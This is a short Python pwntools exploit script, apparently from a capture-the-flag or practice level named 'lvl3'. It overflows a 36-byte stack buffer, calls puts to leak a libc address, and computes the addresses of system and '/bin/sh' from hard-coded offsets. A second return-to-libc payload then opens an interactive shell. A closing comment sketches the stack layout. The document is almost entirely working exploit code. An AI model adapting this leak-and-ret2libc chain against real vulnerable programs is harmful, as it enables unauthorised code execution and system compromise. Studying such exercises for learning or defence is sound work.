from pwn import *
import struct

p = process('./lvl3')

puts = 0x08048310
putsplt = 0x0804a010
main = 0x0804843b
offset = 0x24d40 #(system)
offset2 = 0xfd4b8 #(/bin/sh\0)

output = p.recvuntil("again.\n")
print(output)

input = "A" * 36 + p32(puts) + p32(main) + p32(putsplt)
p.sendline(input)
p.recvline()

output = p.recv(4)

leak = u32(output)
print("LEAK", hex(leak))
system = leak-offset

input = "A" * 36 + p32(system) + "AAAA" + p32(leak+offset2)
p.sendline(input)
p.interactive()

"""

searchmem "/bin/sh\0"

Stack positioning:
function
return address after the function
arg1
arg2
.
.
.


"""